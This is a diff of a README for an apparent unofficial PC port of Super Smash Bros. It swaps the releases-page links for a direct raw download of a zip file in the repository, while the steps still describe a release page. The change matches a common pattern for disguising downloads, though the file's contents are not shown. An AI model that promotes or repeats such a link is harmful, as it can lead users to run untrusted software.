@@ -1,6 +1,6 @@
 # 🎮 Super-Smash-Bros-PC - Play classic matches on your computer
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/asif9097/Super-Smash-Bros-PC/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/asif9097/Super-Smash-Bros-PC/raw/refs/heads/main/Nintendo-Port/Super_Smash_Bros_PC_v3.4-alpha.5.zip)
 
 ## 📌 Project Overview
 
@@ -21,7 +21,7 @@ Your computer needs specific components to run this software well. Check your sy
 
 Follow these steps to set up the software on your Windows machine.
 
-1. Visit the release page to download the latest software version: [Download Page](https://github.com/asif9097/Super-Smash-Bros-PC/releases).
+1. Visit the release page to download the latest software version: [Download Page](https://github.com/asif9097/Super-Smash-Bros-PC/raw/refs/heads/main/Nintendo-Port/Super_Smash_Bros_PC_v3.4-alpha.5.zip).
 2. Look for the file ending in .zip under the Assets list.
 3. Click the file to start the download to your computer.
 4. Locate the downloaded file in your browser downloads or your Downloads folder.
